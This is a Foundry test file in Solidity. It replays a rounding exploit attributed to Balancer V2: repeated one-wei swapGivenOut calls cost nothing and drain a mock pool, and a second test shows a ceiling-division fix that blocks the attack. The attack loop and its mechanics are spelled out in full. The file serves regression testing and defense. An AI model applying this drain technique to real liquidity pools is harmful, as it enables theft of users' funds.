// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/MockVulnerablePool.sol";
import "../src/MockFixedPool.sol";

/// @title BalancerAttackReplay
/// @notice Deterministic proof-of-concept for the Balancer V2 compositional rounding exploit.
///
/// Attack mechanics (see MockVulnerablePool.swapGivenOut):
///   1. Pool starts with reserves (8 wei, 8 wei) — the attack precondition.
///   2. Attacker calls swapGivenOut(amountOut = 1) repeatedly.
///   3. amountOut.mulDown(1e12) = (1 × 1e12) / 1e18 = 0  → scaledOut = 0
///   4. scaledIn = (r0 × 0) / (r1 − 0) = 0               → amountIn  = 0
///   5. The pool sends 1 wei to the attacker and receives nothing.
///   6. After 8 swaps: reserve1 = 0 — pool fully drained.
///
/// The fix (MockFixedPool) replaces divDown with raw ceiling division so
/// that swapGivenOut(1) returns amountIn = ceil(r0 / (r1 − 1)) ≥ 1.
/// Attacker pays more than they extract — no profit possible.
contract BalancerAttackReplay is Test {
    MockVulnerablePool vulnerable;
    MockFixedPool fixed_;

    address attacker = address(0xBEEF);

    function setUp() public {
        vulnerable = new MockVulnerablePool(8, 8, 1e12);
        fixed_     = new MockFixedPool(8, 8);
    }

    /// @notice Demonstrates the exploit: 8 micro-swaps, amountIn=0 every call, pool drained.
    function test_attackDrainsVulnerablePool() public {
        uint256 startReserve1 = vulnerable.reserve1();

        vm.startPrank(attacker);
        uint256 totalExtracted;
        uint256 totalPaid;

        for (uint256 i = 0; i < 65; i++) {
            if (vulnerable.reserve1() == 0) break;
            uint256 amountIn = vulnerable.swapGivenOut(1);
            totalExtracted += 1;
            totalPaid      += amountIn;
        }
        vm.stopPrank();

        console.log("=== Vulnerable Pool Attack ===");
        console.log("  reserve1 before:", startReserve1);
        console.log("  reserve1 after: ", vulnerable.reserve1());
        console.log("  total extracted:", totalExtracted, "wei");
        console.log("  total paid:     ", totalPaid, "wei  <- attacker paid NOTHING");
        console.log("  net profit:     ", totalExtracted - totalPaid, "wei");

        assertEq(totalPaid, 0,             "amountIn must be 0 for every micro-swap");
        assertGt(totalExtracted, 0,        "attacker must extract positive value");
        assertEq(vulnerable.reserve1(), 0, "pool fully drained");
    }

    /// @notice Demonstrates the fix: same attack on MockFixedPool earns no profit.
    function test_fixPreventsExtraction() public {
        vm.startPrank(attacker);
        uint256 totalExtracted;
        uint256 totalPaid;

        for (uint256 i = 0; i < 65; i++) {
            if (fixed_.reserve1() <= 1) break; // divUp requires reserve1 > amountOut
            uint256 amountIn = fixed_.swapGivenOut(1);
            totalExtracted += 1;
            totalPaid      += amountIn;
        }
        vm.stopPrank();

        console.log("=== Fixed Pool (same attack) ===");
        console.log("  total extracted:", totalExtracted, "wei");
        console.log("  total paid:     ", totalPaid, "wei  <- attacker over-pays");

        assertLe(totalExtracted, totalPaid, "fix: attacker never extracts more than they pay");
        assertGt(totalPaid, totalExtracted, "fix: protocol always collects a surplus");
    }
}
